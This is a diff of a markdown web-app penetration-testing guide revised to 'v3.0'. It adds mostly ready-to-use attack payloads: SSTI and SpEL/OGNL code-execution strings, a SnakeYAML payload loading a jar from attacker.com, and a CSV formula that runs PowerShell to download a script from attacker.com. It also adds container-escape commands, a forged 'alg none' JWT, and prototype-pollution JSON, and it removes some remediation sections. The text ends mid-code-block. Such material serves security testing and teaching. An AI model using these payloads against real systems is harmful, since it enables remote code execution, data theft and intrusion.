@@ -1,5 +1,5 @@
-# **Webapp Security Testing Framework: Detailed OWASP Top 10 Focus** 
-## (early 2025) v2
+# **Webapp Security Testing Framework: Comprehensive OWASP Top 10 + Modern Attack Vectors** 
+## (Autumn 2025) v3.0
 
 | Vulnerability                   | Technical Remediation & Code Examples                                                                                                                                                                                                                                                                                                                                                                                                                                              |
 |---------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
@@ -14,277 +14,1216 @@
 | **Using Components with Known Vulnerabilities** | - **Integrate SCA tools** (Dependabot, Snyk, OWASP Dependency-Check)<br>- **Virtual patching with WAFs**<br>- **Maintain a SBOM** with automated CVE monitoring<br>- **Container scanning** (Trivy, Clair)<br>**Java**:<br>```xml\n<!-- Maven Dependency-Check plugin -->\n```<br>**Python**:<br>```bash\n$ bandit -r .\n```<br>**Go**:<br>```bash\n$ gosec ./...\n```<br>**Node.js**:<br>```bash\n$ snyk test\n``` |
 | **Insufficient Logging & Monitoring** | - **Centralized logging** (ELK, Splunk, Grafana Loki)<br>- **Log integrity** with crypto-chaining<br>- **Anomaly detection** using ML/behavioral analysis<br>- **SOAR for incident response**<br>- **Deploy honeytokens/canary tokens**<br>**Java**:<br>```java\n// Using Logback for structured logging\nlogger.warn(\"Validation failure: {}\", field);\n```<br>**Python**:<br>```python\nimport logging\nlogging.warning('Validation failure: %s', field)\n```<br>**Go**:<br>```go\nlog.Printf(\"Validation failure: %s\", field)\n```<br>**Node.js**:<br>```js\nconsole.warn('Validation failure:', field);\n``` |
 
+---
 
+## **1. Injection (SQL, NoSQL, Command, SSTI, GraphQL)**
 
-## **1. Injection (SQL, NoSQL, Command Injection)**
+### **Traditional Injection Testing**
+- **Step 1: Identify User Inputs**: Start by identifying all user input fields such as login forms, search bars, and URL parameters.
+- **Step 2: Test with Common Payloads**:
+  - For **SQL Injection**: Test with payloads like `' OR 1=1 --` or `' UNION SELECT null, username, password FROM users--`.
+  - For **NoSQL Injection**: Test with `{ "$ne": null }` in MongoDB queries.
+  - For **Command Injection**: Test with payloads like `; ls -la` or `&& whoami`.
 
-### **Penetration Testing Steps**
-   - **Step 1: Identify User Inputs**: Start by identifying all user input fields such as login forms, search bars, and URL parameters.
-   - **Step 2: Test with Common Payloads**:
-     - For **SQL Injection**: Test with payloads like `' OR 1=1 --` or `' UNION SELECT null, username, password FROM users--`.
-     - For **NoSQL Injection**: Test with `{ "$ne": null }` in MongoDB queries.
-     - For **Command Injection**: Test with payloads like `; ls -la` or `&& whoami`.
-   - **Step 3: Verify Error Messages**: If the application reveals database errors, this could indicate that the input is directly passed into a query.
+### **🆕 Server-Side Template Injection (SSTI)**
+**Critical for Modern Frameworks**
 
-### **Example of a Flaw**:
-   - **Flaw**: The application allows SQL queries directly in the input field without sanitization.
-   - **Example Payload**: `admin' OR 1=1 --`
+#### **Testing Steps**:
+- **Step 1**: Identify template engines by error messages or HTTP headers
+- **Step 2**: Test basic math expressions: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
+- **Step 3**: Escalate to code execution payloads
 
-   **Impact**: Unauthorized access to sensitive data or users' accounts.
+#### **SSTI Payloads by Engine**:
+
+**Jinja2 (Python/Flask)**:
+```python
+# Basic detection
+{{7*7}}
+{{config}}
+{{config.items()}}
+
+# Code execution
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+```
+
+**Twig (PHP)**:
+```php
+# Basic detection
+{{7*7}}
+{{dump(app)}}
+
+# Code execution
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+```
+
+**Freemarker (Java)**:
+```java
+# Basic detection
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+
+# Code execution
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
+```
+
+**Handlebars (Node.js)**:
+```javascript
+# Code execution
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{#with (concat (lookup string 0) (lookup string 1))}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 (slice 2))}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+### **🆕 GraphQL Injection**
+
+#### **Testing Steps**:
+- **Step 1**: Identify GraphQL endpoints (`/graphql`, `/graphiql`, `/api/graphql`)
+- **Step 2**: Test introspection queries
+- **Step 3**: Test for injection in arguments
+
+#### **GraphQL Payloads**:
+```graphql
+# Introspection attack
+{
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+        }
+      }
+    }
+  }
+}
+
+# SQL injection in GraphQL arguments
+{
+  user(id: "1' OR 1=1--") {
+    name
+    email
+  }
+}
+
+# Denial of Service via deep nesting
+{
+  author(id: "1") {
+    posts {
+      author {
+        posts {
+          author {
+            posts {
+              # ... continue nesting
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+### **🆕 Expression Language Injection**
+
+**Spring EL Injection**:
+```java
+# Detection
+${7*7}
+#{7*7}
+
+# Code execution
+${T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+```
+
+**OGNL Injection (Struts)**:
+```java
+# Detection
+%{7*7}
+
+# Code execution
+%{(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#_memberAccess['allowStaticMethodAccess']=true)(@java.lang.Runtime@getRuntime().exec('id'))}
+```
 
 ### **Remediation**:
-   - **Use Prepared Statements**: Implement parameterized queries or use ORM frameworks (e.g., **Hibernate**, **Django ORM**) to prevent direct injection.
-   - **Input Validation**: Validate inputs to ensure that no special characters or query-related keywords are included.
-   - **Error Handling**: Ensure that database errors are not exposed to the user. Use **generic error messages**.
-
-### **Tools**:
-   - [Burp Suite](https://portswigger.net/burp) – For manual testing and identifying SQL injection.
-   - [SQLMap](http://sqlmap.org/) – Automated tool for SQL injection testing.
-   - [OWASP ZAP](https://www.zaproxy.org/) – For scanning SQL injection and other vulnerabilities.
+- **Template Security**: Use **sandboxed template engines** with restricted function access
+- **GraphQL Security**: Implement **query complexity analysis**, **depth limiting**, and **rate limiting**
+- **Expression Language**: Disable or restrict **SpEL/OGNL** evaluation in user inputs
+- **Input Validation**: Apply **strict input validation** with allowlists for all injection types
 
 ---
 
-## **2. Broken Authentication**
+## **🆕 Microservices & Container Security**
 
-### **Penetration Testing Steps**
-   - **Step 1: Test for Brute Force**: Use **Hydra** or **Burp Suite Intruder** to attempt brute-forcing the login page.
-   - **Step 2: Session Management Testing**: Test for **session fixation**, **session hijacking**, and **predictable session IDs**.
-     - Try manipulating the session cookie values and see if you can impersonate another user.
-   - **Step 3: Test for Weak Password Policies**: Check if weak passwords like `123456` or `password` are allowed.
+### **Service Mesh Security Testing**
 
-### **Example of a Flaw**:
-   - **Flaw**: The login page is vulnerable to brute-force attacks due to weak rate-limiting or a lack of CAPTCHA.
-   - **Example Attack**: An attacker uses a tool like **Hydra** to repeatedly try common password combinations.
+#### **Istio/Envoy Misconfigurations**:
+```bash
+# Test for service mesh bypass
+curl -H "Host: internal-service.mesh.local" http://external-endpoint/
 
-   **Impact**: An attacker could gain unauthorized access to user accounts.
+# mTLS verification bypass
+curl -k --cert fake.crt --key fake.key https://service.mesh.local/admin
 
-### **Remediation**:
-   - **Rate Limiting**: Implement **rate-limiting** on the login page to prevent brute force.
-   - **Multi-Factor Authentication (MFA)**: Use MFA (e.g., **TOTP**, **SMS-based authentication**) to secure login.
-   - **Session Fixation Protection**: Regenerate the session ID after login to prevent session fixation.
-   - **Strong Password Policies**: Enforce strong passwords and limit the number of failed login attempts.
+# Envoy admin interface exposure
+curl http://service:9901/config_dump
+curl http://service:9901/clusters
+```
 
-### **Tools**:
-   - [Hydra](https://github.com/vanhauser-thc/thc-hydra) – For brute-forcing login attempts.
-   - [Burp Suite](https://portswigger.net/burp) – For brute force and session manipulation testing.
-   - [OWASP ZAP](https://www.zaproxy.org/) – To scan for broken authentication issues.
+### **Container Escape Testing**
 
----
+#### **Docker Container Breakout**:
+```bash
+# Check for privileged containers
+docker inspect <container> | grep Privileged
 
-## **3. Sensitive Data Exposure**
+# Test for host filesystem access
+ls -la /proc/1/root/
+mount | grep docker
 
-### **Penetration Testing Steps**
-   - **Step 1: Check for HTTPS**: Ensure that sensitive data is transmitted over **HTTPS** and not HTTP.
-   - **Step 2: Test Data Encryption**: Ensure that sensitive data is encrypted both in transit and at rest.
-   - **Step 3: Test for Insecure Data Storage**: Check if sensitive data like passwords, API keys, or tokens are stored insecurely in **plaintext**.
+# Capability exploitation
+capsh --print
+getcap -r / 2>/dev/null
 
-### **Example of a Flaw**:
-   - **Flaw**: Sensitive data like **passwords** is being transmitted over **HTTP**.
-   - **Example Payload**: A user submits their password on an unencrypted HTTP login form.
+# Test for exposed Docker socket
+ls -la /var/run/docker.sock
+curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
+```
 
-   **Impact**: Sensitive data is vulnerable to **Man-in-the-Middle (MITM)** attacks, exposing user credentials.
+#### **Kubernetes Pod Security**:
+```yaml
+# Test pod with dangerous security context
+apiVersion: v1
+kind: Pod
+metadata:
+  name: security-test
+spec:
+  securityContext:
+    runAsUser: 0
+    fsGroup: 0
+  containers:
+  - name: test
+    image: alpine
+    securityContext:
+      privileged: true
+      allowPrivilegeEscalation: true
+      capabilities:
+        add:
+        - SYS_ADMIN
+        - NET_ADMIN
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+```
 
-### **Remediation**:
-   - **Force HTTPS**: Ensure **HTTPS** is enabled across all endpoints.
-   - **Use Strong Encryption**: Encrypt sensitive data at rest using **AES-256** and use **TLS** (Transport Layer Security) for data in transit.
-   - **Tokenization**: Use tokenization or **Hashing (e.g., bcrypt, Argon2)** for sensitive data like passwords.
+### **API Gateway Security**
 
-### **Tools**:
-   - [SSL Labs](https://www.ssllabs.com/ssltest/) – To test SSL/TLS configurations.
-   - [OWASP ZAP](https://www.zaproxy.org/) – For automated security testing, including checking for sensitive data exposure.
+#### **Gateway Bypass Techniques**:
+```bash
+# Host header injection
+curl -H "Host: internal-api.local" http://gateway/api/admin
 
----
+# Path traversal
+curl http://gateway/api/../admin
+curl http://gateway/api/%2e%2e/admin
 
-## **4. XML External Entities (XXE)**
+# HTTP method override
+curl -X POST -H "X-HTTP-Method-Override: DELETE" http://gateway/api/users/1
 
-### **Penetration Testing Steps**
-   - **Step 1: Identify XML Parsers**: Look for endpoints that accept **XML** input.
-   - **Step 2: Test for XXE**: Send an XXE payload like `<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd">] >`.
-   - **Step 3: Check for Information Disclosure**: Attempt to access internal files or services through the XXE payload.
+# Protocol smuggling
+curl -H "Transfer-Encoding: chunked" -H "Content-Length: 0" -d $'1\r\nX\r\n0\r\n\r\n'
+```
 
-### **Example of a Flaw**:
-   - **Flaw**: The application accepts XML input and processes it insecurely, allowing external entity references.
-   - **Example Payload**: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">] >`
+### **Inter-Service Communication**
 
-   **Impact**: The attacker can access sensitive files like `/etc/passwd` or initiate **Denial of Service (DoS)** attacks.
+#### **Service-to-Service Authentication Flaws**:
+```bash
+# JWT manipulation for service calls
+# Test with modified service claims
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJzZXJ2aWNlLWEiLCJhdWQiOiJzZXJ2aWNlLWIiLCJyb2xlIjoiYWRtaW4ifQ.
 
-### **Remediation**:
-   - **Disable DTDs**: Disable **Document Type Definitions (DTD)** in XML parsers.
-   - **Use Secure XML Parsers**: Ensure that XML libraries and parsers are configured securely (e.g., **JAXP**, **libxml2**).
-   - **Input Validation**: Validate all XML input to ensure it cannot contain harmful entities.
+# Service mesh policy bypass
+curl -H "X-Forwarded-For: 10.0.0.1" -H "X-Real-IP: 10.0.0.1" http://internal-service/
 
-### **Tools**:
-   - [OWASP ZAP](https://www.zaproxy.org/) – For automated XXE vulnerability scanning.
-   - [Burp Suite](https://portswigger.net/burp) – To manually test XXE and other injection flaws.
-
----
-
-## **5. Broken Access Control**
-
-### **Penetration Testing Steps**
-   - **Step 1: Test URL Access Controls**: Try accessing URLs that belong to other users, such as `/admin`, `/profile/1234`, to see if the application enforces proper access control.
-   - **Step 2: Test for Authorization Bypass**: Try manipulating the request parameters to access resources without proper permissions.
-   - **Step 3: Test for API Access Control Issues**: Intercept API calls and check if unauthorized users can access endpoints they shouldn’t.
-
-### **Example of a Flaw**:
-   - **Flaw**: An attacker can access another user's profile by changing the user ID in the URL.
-   - **Example Attack**: Accessing `/profile/5678` as `/profile/1234`.
-
-   **Impact**: Users can access other users' data or administrative functionality.
-
-### **Remediation**:
-   - **Implement RBAC**: Ensure that **Role-Based Access Control (RBAC)** is enforced for both the UI and API endpoints.
-   - **Use Server-Side Authorization**: Always perform authorization checks on the server, not just on the client-side.
-   - **Least Privilege**: Apply the **least privilege principle** to all users and services.
-
-### **Tools**:
-   - [Burp Suite](https://portswigger.net/burp) – For testing broken access control via request interception and manipulation.
-   - [OWASP ZAP](https://www.zaproxy.org/) – For automated scanning of access control issues.
-
----
-
-## **6. Security Misconfiguration**
-
-### **Penetration Testing Steps**
-   - **Step 1: Identify Default Configurations**: Look for default configurations that should be modified, such as **default admin credentials**, **debugging enabled**, and **default ports**.
-   - **Step 2: Test HTTP Headers**: Check for missing or weak HTTP headers like **Strict-Transport-Security**, **X-Content-Type-Options**, and **X-Frame-Options**.
-   - **Step 3: Test for Open Ports**: Use tools like **Nmap** or **Masscan** to detect unnecessary open ports.
-
-### **Example of a Flaw**:
-   - **Flaw**: The application is running with default admin credentials or unnecessary services exposed.
-   - **Example Attack**: An attacker exploits an exposed **admin** panel because of the default credentials.
-
-   **Impact**: Unsecured admin panels or exposed services can lead to full system compromise.
-
-### **Remediation**:
-   - **Change Default Credentials**: Always change default credentials and disable unused services.
-   - **Enable Security Headers**: Configure strong HTTP headers to prevent attacks like **clickjacking** or **XSS**.
-   - **Remove Unnecessary Services**: Disable all non-essential services and ports.
-
-### **Tools**:
-   - [Nikto](https://github.com/sullo/nikto) – A web scanner that identifies misconfigurations.
-   - [OWASP ZAP](https://www.zaproxy.org/) – To identify misconfigurations in HTTP headers.
+# mTLS certificate validation bypass
+openssl s_client -connect service:443 -cert client.crt -key client.key -verify_return_error
+```
 
 ---
 
-## **7. Cross-Site Scripting (XSS)**
+## **2. Broken Authentication + Modern Auth Patterns**
 
-### **Penetration Testing Steps**
-   - **Step 1: Test User Input**: Inject payloads like `<script>alert('XSS')</script>` into form fields, URL parameters, or cookies.
-   - **Step 2: Test Stored vs. Reflected XSS**: Check if payloads are stored and then reflected in responses (stored XSS) or immediately executed in the response (reflected XSS).
-   - **Step 3: Check for DOM-Based XSS**: Use tools like **Burp Suite** to intercept and modify client-side scripts that may lead to DOM-based XSS.
+### **Traditional Authentication Testing**
+- **Step 1: Test for Brute Force**: Use **Hydra** or **Burp Suite Intruder** to attempt brute-forcing the login page.
+- **Step 2: Session Management Testing**: Test for **session fixation**, **session hijacking**, and **predictable session IDs**.
 
-### **Example of a Flaw**:
-   - **Flaw**: The application allows users to submit input that is not properly sanitized, leading to script execution.
-   - **Example Payload**: `<script>alert('XSS')</script>`
+### **🆕 OAuth 2.0/OpenID Connect Flaws**
 
-   **Impact**: Malicious scripts can execute in a victim's browser, stealing cookies or performing actions on behalf of the user.
+#### **OAuth Testing Steps**:
+```bash
+# Authorization code interception
+https://auth.example.com/oauth/authorize?client_id=123&redirect_uri=https://attacker.com&response_type=code
 
-### **Remediation**:
-   - **Input Sanitization**: Always sanitize and escape user input to prevent script injection.
-   - **Content Security Policy (CSP)**: Use a strict **CSP** to block inline JavaScript and reduce the impact of XSS.
-   - **Use HttpOnly Cookies**: Set the `HttpOnly` flag on session cookies to prevent JavaScript from accessing them.
+# PKCE bypass
+POST /oauth/token
+Content-Type: application/x-www-form-urlencoded
 
-### **Tools**:
-   - [Burp Suite](https://portswigger.net/burp) – For testing XSS in web applications.
-   - [OWASP ZAP](https://www.zaproxy.org/) – For automated XSS vulnerability scanning.
-   - [XSStrike](https://github.com/s0md3v/XSStrike) – Advanced XSS detection and exploitation.
+grant_type=authorization_code&code=AUTH_CODE&client_id=123&code_verifier=WEAK_VERIFIER
 
----
+# Scope elevation
+https://auth.example.com/oauth/authorize?client_id=123&scope=read+write+admin
 
-## **8. Insecure Deserialization**
+# State parameter bypass (CSRF)
+https://auth.example.com/oauth/authorize?client_id=123&redirect_uri=https://client.com/callback&response_type=code
+```
 
-### **Penetration Testing Steps**
-   - **Step 1: Identify Deserialized Data**: Look for functions or endpoints that accept serialized objects. Common sources of serialized data are **HTTP cookies**, **REST APIs**, and **files**.
-   - **Step 2: Manipulate Serialized Data**: Modify serialized objects and observe the application’s behavior. Use tools like **ysoserial** to generate payloads.
-   - **Step 3: Test for Code Execution**: Check if modifying the serialized object leads to the execution of unintended code (e.g., **remote code execution**).
+### **🆕 JWT Security Testing**
 
-### **Example of a Flaw**:
-   - **Flaw**: The application accepts and deserializes user-controlled data without any validation or checking, allowing attackers to inject malicious objects.
-   - **Example Attack**: An attacker sends a modified object through the **HTTP cookie** to execute arbitrary code on the server.
-   
-   **Example Payload**: `ysoserial` payload that exploits the deserialization vulnerability to execute a command on the server.
+#### **JWT Attack Vectors**:
+```python
+# Algorithm confusion attack
+import jwt
 
-   **Impact**: Remote Code Execution (RCE), unauthorized access to sensitive information, or privilege escalation.
+# Change algorithm from RS256 to HS256
+header = {"typ": "JWT", "alg": "HS256"}
+payload = {"sub": "admin", "role": "admin"}
+# Use public key as HMAC secret
+token = jwt.encode(payload, public_key, algorithm="HS256", headers=header)
 
-### **Remediation**:
-   - **Use Safe Serialization Libraries**: Use **JSON** or **XML** (with validation) instead of **Java serialization**.
-   - **Signature Validation**: Ensure that serialized objects are **signed** to detect any tampering.
-   - **Whitelist Valid Classes**: Implement a **whitelist** for acceptable classes to be deserialized.
+# None algorithm attack
+header = {"typ": "JWT", "alg": "none"}
+payload = {"sub": "admin", "role": "admin"}
+token = jwt.encode(payload, "", algorithm="none", headers=header)
 
-### **Tools**:
-   - [ysoserial](https://github.com/frohoff/ysoserial) – A tool to generate payloads for deserialization attacks.
-   - [Burp Suite](https://portswigger.net/burp) – For manual testing of serialized objects in cookies or requests.
-   - [OWASP ZAP](https://www.zaproxy.org/) – To test for insecure deserialization.
+# Key confusion attack
+# Try using kid parameter to point to different keys
+header = {"typ": "JWT", "alg": "RS256", "kid": "../../public.key"}
+```
 
----
+### **🆕 WebAuthn/FIDO2 Testing**:
+```javascript
+// Test for replay attacks
+const credential = await navigator.credentials.create({
+    publicKey: {
+        challenge: oldChallenge, // Reuse old challenge
+        rp: { name: "Example" },
+        user: { id: new Uint8Array([1,2,3]), name: "user", displayName: "User" },
+        pubKeyCredParams: [{ alg: -7, type: "public-key" }]
+    }
+});
 
-## **9. Using Components with Known Vulnerabilities**
-
-### **Penetration Testing Steps**
-   - **Step 1: Identify All Components**: Start by identifying all the **third-party libraries** and **frameworks** used by your application (e.g., Spring Boot, Apache Struts).
-   - **Step 2: Check for Vulnerabilities**: Use tools like **OWASP Dependency-Check**, **Snyk**, or **Retire.js** to check for known vulnerabilities in components.
-   - **Step 3: Check for Outdated Versions**: Ensure that all libraries and dependencies are up-to-date and patched for known vulnerabilities.
-
-### **Example of a Flaw**:
-   - **Flaw**: The application uses an outdated version of **Apache Struts** that contains a **remote code execution vulnerability** (CVE-2017-5638).
-   - **Example Attack**: The attacker exploits the known vulnerability in the outdated **Struts** component to execute arbitrary code on the server.
-
-   **Impact**: Remote Code Execution (RCE) in your application due to the use of outdated components.
-
-### **Remediation**:
-   - **Dependency Management**: Use **dependency management** tools to track and automatically update third-party libraries.
-   - **Use SCA Tools**: Regularly scan for vulnerabilities in dependencies using tools like **Snyk**, **OWASP Dependency-Check**, or **Retire.js**.
-   - **Patch Management**: Immediately apply **security patches** and upgrade to the latest stable versions of dependencies.
-
-### **Tools**:
-   - [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) – To identify known vulnerabilities in third-party libraries.
-   - [Snyk](https://snyk.io/) – Continuously monitor and patch dependencies.
-   - [Retire.js](https://github.com/rioscus/retire.js) – To find outdated JavaScript libraries with known vulnerabilities.
+// Test for origin validation bypass
+const credential = await navigator.credentials.get({
+    publicKey: {
+        challenge: challenge,
+        allowCredentials: [{
+            type: "public-key",
+            id: credentialId
+        }]
+    }
+});
+```
 
 ---
 
-## **10. Insufficient Logging & Monitoring**
+## **3. Sensitive Data Exposure + Cloud Security**
 
-### **Penetration Testing Steps**
-   - **Step 1: Check for Log Availability**: Ensure that security-related events, such as failed login attempts, privilege escalation, and unusual API calls, are logged.
-   - **Step 2: Test for Alerting**: Simulate security events (e.g., brute-force login attempts) and check if appropriate **alerts** are triggered.
-   - **Step 3: Check Log Integrity**: Ensure that logs are **immutable** and stored securely (e.g., use **WORM** or **SIEM** systems).
+### **Traditional Data Exposure Testing**
+- **Step 1: Check for HTTPS**: Ensure that sensitive data is transmitted over **HTTPS** and not HTTP.
+- **Step 2: Test Data Encryption**: Ensure that sensitive data is encrypted both in transit and at rest.
 
-### **Example of a Flaw**:
-   - **Flaw**: The application does not log failed login attempts or does not log any significant security events.
-   - **Example Attack**: An attacker performs multiple brute-force login attempts, but the application doesn't log or alert on this behavior.
-   
-   **Impact**: Attackers can remain undetected while performing malicious activities like credential stuffing or privilege escalation.
+### **🆕 Cloud Storage Misconfiguration**
 
-### **Remediation**:
-   - **Enable Comprehensive Logging**: Log all security-related events, including **failed logins**, **account changes**, and **access to sensitive data**.
-   - **Integrate SIEM Solutions**: Use **Security Information and Event Management (SIEM)** systems to monitor logs and set up alerts for suspicious activities.
-   - **Log Integrity**: Ensure logs are stored securely and are **tamper-proof** using methods like **WORM (Write Once, Read Many)**.
+#### **AWS S3 Bucket Testing**:
+```bash
+# Test for public read access
+aws s3 ls s3://bucket-name --no-sign-request
+aws s3 sync s3://bucket-name . --no-sign-request
 
-### **Tools**:
-   - [Splunk](https://www.splunk.com/) – For centralized logging and monitoring.
-   - [ELK Stack (Elasticsearch, Logstash, Kibana)](https://www.elastic.co/elk-stack) – For log aggregation, searching, and alerting.
-   - [OSSEC](https://www.ossec.net/) – Host-based intrusion detection for log monitoring.
+# Test for public write access
+echo "test" > test.txt
+aws s3 cp test.txt s3://bucket-name/ --no-sign-request
+
+# Bucket policy enumeration
+aws s3api get-bucket-policy --bucket bucket-name
+aws s3api get-bucket-acl --bucket bucket-name
+```
+
+#### **Azure Blob Storage Testing**:
+```bash
+# Test for public access
+curl https://storage.blob.core.windows.net/container/file.txt
+
+# Container enumeration
+curl https://storage.blob.core.windows.net/container?restype=container&comp=list
+```
+
+#### **Google Cloud Storage Testing**:
+```bash
+# Test for public access
+gsutil ls gs://bucket-name
+curl https://storage.googleapis.com/bucket-name/file.txt
+
+# Bucket permissions
+gsutil iam get gs://bucket-name
+```
+
+### **🆕 Container Secrets Exposure**:
+```bash
+# Check for secrets in container environment
+docker exec container env | grep -i password
+docker exec container env | grep -i secret
+docker exec container env | grep -i key
+
+# Check for secrets in container filesystem
+docker exec container find / -name "*.pem" -o -name "*.key" -o -name ".env" 2>/dev/null
+
+# Docker history secrets
+docker history --no-trunc image:tag | grep -i password
+```
+
+### **🆕 Infrastructure-as-Code Security**:
+```terraform
+# Terraform security testing
+resource "aws_s3_bucket" "bad_example" {
+  bucket = "my-bucket"
+  
+  # Missing encryption
+  # Missing public access block
+  # Missing versioning
+}
+
+# Good example
+resource "aws_s3_bucket" "good_example" {
+  bucket = "my-secure-bucket"
+}
+
+resource "aws_s3_bucket_server_side_encryption_configuration" "example" {
+  bucket = aws_s3_bucket.good_example.id
+
+  rule {
+    apply_server_side_encryption_by_default {
+      kms_master_key_id = aws_kms_key.example.arn
+      sse_algorithm     = "aws:kms"
+    }
+  }
+}
+```
 
 ---
 
+## **4. XML External Entities (XXE) + Modern Data Formats**
 
-# Summary: Technical Remediation Strategy for OWASP Top 10
+### **Traditional XXE Testing**
+- **Step 1: Identify XML Parsers**: Look for endpoints that accept **XML** input.
+- **Step 2: Test for XXE**: Send an XXE payload like `<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd">] >`.
 
-| **Vulnerability** | **Technical Remediation** |
-|-------------------|---------------------------|
-| **Injection** | • Implement **parameterized queries** (e.g., `PreparedStatement` in Java, parameterized Mongoose queries)<br>• Use **ORM frameworks** with proper binding (Hibernate, Sequelize, Django ORM)<br>• Apply **input validation** with both whitelist approach and regex pattern matching<br>• Implement **context-aware output encoding** based on the interpreter type<br>• Use WAF rules to detect and block injection patterns |
-| **Broken Authentication** | • Implement **adaptive rate-limiting** with exponential backoff (e.g., 10, 20, 40 seconds)<br>• Use **PBKDF2/Argon2id/bcrypt** with proper work factors for password hashing<br>• Enforce **MFA** via TOTP, WebAuthn/FIDO2, or push notifications<br>• Apply **cryptographically secure** session management with anti-CSRF tokens<br>• Implement **secure password recovery** with time-limited single-use tokens |
-| **Sensitive Data Exposure** | • Configure TLS 1.2+ with **forward secrecy** ciphers and proper HSTS implementation<br>• Use **envelope encryption** with key rotation policies and HSMs/KMS<br>• Apply data classification with **differential privacy** for analytics<br>• Implement **tokenization** for PII and PHI instead of direct storage<br>• Use **memory-hard KDFs** (Argon2) with proper salt/pepper for credentials |
-| **XML External Entities (XXE)** | • Configure XML parsers with `FEATURE_SECURE_PROCESSING=true`, `DOMParser.isValidating=false`<br>• Use **schema validation** with custom DTD resolution<br>• Implement **XML filtering proxies** that strip DTDs and external entities<br>• Apply **application-layer gateways** with XML sanitization<br>• Migrate to **JSON/YAML** where possible with schema validation |
-| **Broken Access Control** | • Implement **ABAC** (Attribute-Based Access Control) in addition to RBAC<br>• Use **JWT with appropriate claims** and server-side validation<br>• Apply **resource-level permission checking** at all API endpoints<br>• Implement **API gateway authorization** with OAuth 2.0 scopes<br>• Use **timeboxed capabilities** (temporary access tokens) for sensitive operations |
-| **Security Misconfiguration** | • Implement **infrastructure-as-code** with security scanning (Terraform, CloudFormation)<br>• Apply comprehensive **CSP with nonce/hash** directives and report-uri<br>• Use **CORS with specific origins** and appropriate credential settings<br>• Implement **reverse proxy** with security headers (`X-Content-Type-Options`, `X-Frame-Options`)<br>• Apply automated **configuration drift detection** with remediation workflows |
-| **Cross-Site Scripting (XSS)** | • Implement **context-specific output encoding** for different HTML contexts<br>• Use **trusted template systems** with automatic escaping (React, Vue, Angular)<br>• Apply **strict CSP** with nonce-based or hash-based directives and no `unsafe-inline`<br>• Implement **DOM sanitization libraries** (DOMPurify) for HTML handling<br>• Use **SameSite=Strict** and `HttpOnly` flags for sensitive cookies |
-| **Insecure Deserialization** | • Replace native serialization with **data format validation** (JSON Schema, Protocol Buffers)<br>• Implement **HMAC integrity verification** before deserialization<br>• Use **serialization firewall** that validates object types and properties<br>• Apply **allowlist of safe classes/types** for deserialization<br>• Implement deserialization within a **restricted sandbox environment** |
-| **Using Components with Known Vulnerabilities** | • Integrate **SCA tools** (Dependabot, Snyk, OWASP Dependency-Check) in CI/CD pipeline<br>• Implement **virtual patching** at WAF level for unpatched vulnerabilities<br>• Use **software bill of materials (SBOM)** with automated CVE monitoring<br>• Apply **container security scanning** (Trivy, Clair) in registry and runtime<br>• Implement **vulnerability management program** with risk-based patching |
-| **Insufficient Logging & Monitoring** | • Create **centralized logging** with structured data (ELK, Splunk, Grafana Loki)<br>• Implement **log integrity** with cryptographic chaining or blockchain techniques<br>• Apply **anomaly detection** using ML/behavioral analysis for unusual patterns<br>• Use **SOAR** (Security Orchestration, Automation and Response) for incident handling<br>• Implement **active defense** with honeytokens and canary tokens |
+### **🆕 YAML Deserialization Attacks**
 
+#### **YAML Injection Payloads**:
+```yaml
+# Python PyYAML
+!!python/object/apply:subprocess.check_output [['id']]
+!!python/object/apply:os.system ['id']
+
+# Ruby YAML
+--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::SpecFetcher
+i: y
+
+# Java SnakeYAML
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/payload.jar"]]]]
+```
+
+### **🆕 JSON Injection & Prototype Pollution**:
+```javascript
+// Prototype pollution via JSON
+{
+  "__proto__": {
+    "admin": true,
+    "role": "administrator"
+  }
+}
+
+// Constructor pollution
+{
+  "constructor": {
+    "prototype": {
+      "admin": true
+    }
+  }
+}
+
+// Deep merge pollution
+{
+  "user": {
+    "__proto__": {
+      "isAdmin": true
+    }
+  }
+}
+```
+
+### **🆕 CSV Injection/Formula Injection**:
+```csv
+# Excel formula injection
+=cmd|'/c calc.exe'!A1
+=cmd|'/c powershell IEX(wget attacker.com/ps.ps1)'!A1
+@SUM(1+1)*cmd|'/c calc.exe'!A1
+
+# Google Sheets
+=IMPORTRANGE("https://attacker.com/malicious", "A1:A1")
